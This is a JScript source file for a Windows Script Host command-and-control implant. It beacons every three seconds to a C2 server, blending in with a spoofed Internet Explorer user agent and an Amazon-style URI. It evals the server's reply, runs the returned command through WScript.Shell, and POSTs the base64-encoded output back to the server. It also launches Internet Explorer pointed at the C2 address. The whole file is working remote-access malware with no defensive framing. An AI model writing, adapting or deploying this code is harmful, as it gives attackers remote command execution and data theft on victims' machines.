//#######################
//   GLOBAL VARIABLES
//#######################
var curcmd = "";
var serverMsg = "";
var c2url = "http://10.0.0.134";
var objShell = new ActiveXObject("WScript.Shell");
var beaconTime = 3000;
var useragent = "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
var uri = "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
var xFrameOptions = "SAMEORIGIN";
var contentEncoding = "gzip";
var contentType = "text/xml";
//var c2url = "http://ssppayments.com/c2.html";

var target = c2url + uri;
var initcmd = "";

//#######################
//   FUNCTIONS
//#######################
function webRequest(target) {
  var res;
  try
  {
    var WinHttpReq = new ActiveXObject( "WinHttp.WinHttpRequest.5.1" );
    WinHttpReq.Open("GET", target, false);
    //  Send the HTTP request.
    WinHttpReq.Send();
    // Wait for the entire response.
    WinHttpReq.WaitForResponse();
    //  Retrieve the response text.
    res = WinHttpReq.ResponseText;
  }
  catch (objError)
  {
    res = objError + "\n"
    res += "WinHTTP returned error: " +
        (objError.number & 0xFFFF).toString() + "\n\n";
    res += objError.description;
  }
  return res;
}
function webPost(target, cmdResponse) {
  var res;
  try
  {
    var WinHttpReq = new ActiveXObject( "WinHttp.WinHttpRequest.5.1" );
    WinHttpReq.Open("POST", target, false);

    // Set HTTP Headers
    WinHttpReq.setRequestHeader("User-Agent", useragent);
    WinHttpReq.setRequestHeader("X-Frame-Options", xFrameOptions);
    WinHttpReq.setRequestHeader("Content-Type", contentType);

    //  Send the HTTP request.
    WinHttpReq.Send(cmdResponse);
    // Wait for the entire response.
    WinHttpReq.WaitForResponse();
    //  Retrieve the response text.
    res = WinHttpReq.ResponseText;
    //WScript.Echo(res);
  }
  catch (objError)
  {
    res = objError + "\n"
    res += "WinHTTP returned error: " +
        (objError.number & 0xFFFF).toString() + "\n\n";
    res += objError.description;
  }
  return res;
}
function browserInject() {
  //Load React-Gryffindor into the browser's homepage and instantiate
  //var c2url = "http://10.0.0.189/";
  var ieShell = new ActiveXObject("WScript.Shell");
  //ieShell.Run("C:\\Program Files\\Internet Explorer\\iexplore.exe");
  ieShell.Run("\"C:\\Program Files\\Internet Explorer\\IExplore.exe\"" + c2url, 2);
  WScript.Sleep(3000);
}
function execCommand() {
  WScript.Sleep(3000);
}
function base64Encode(data) {
   var xml = WScript.CreateObject("MSXml2.DOMDocument");
   var element = xml.createElement("Base64Data");
   element.dataType = "bin.base64";
   element.nodeTypedValue = streamStringToBinary(data);

   return element.text.replace(/\n/g, "");
}
function streamStringToBinary(data) {
   var inputStream = WScript.CreateObject("ADODB.Stream");
   inputStream.Type = 2;
   inputStream.CharSet = "us-ascii";
   inputStream.Open();
   inputStream.WriteText(data);

   //Change stream to binary
   inputStream.Position = 0;
   inputStream.Type = 1;
   inputStream.Position = 0;

   var streamData = inputStream.Read();
   inputStream.Close();
   return streamData;
}
//#######################
//   MAIN EXECUTION
//#######################
while(true)
{
  var serverMsg = webRequest(target);
   //Check for binject
   //if not then go direct

  //execution
  try
  {
    if (curcmd != serverMsg) {
      //Dangerous eval on unsanitized data here
      var retval = "";
      eval("jsObject="+serverMsg);
      var execStatus = objShell.Exec(jsObject.cmd);

      if (execStatus.status == 2) {
         retval = execStatus.StdErr.ReadAll();
      } else {
         retval = execStatus.StdOut.ReadAll();
      }

      var resp = '{"agentid":"1","taskid":"1","cmd":"' + jsObject.cmd + '","retval":"' + base64Encode(retval) + '"}';
      curcmd = serverMsg;
      webPost(target, resp);
    }
  }
  catch (e)
  {
     WScript.Sleep(beaconTime);
  }
  WScript.Sleep(beaconTime);
}
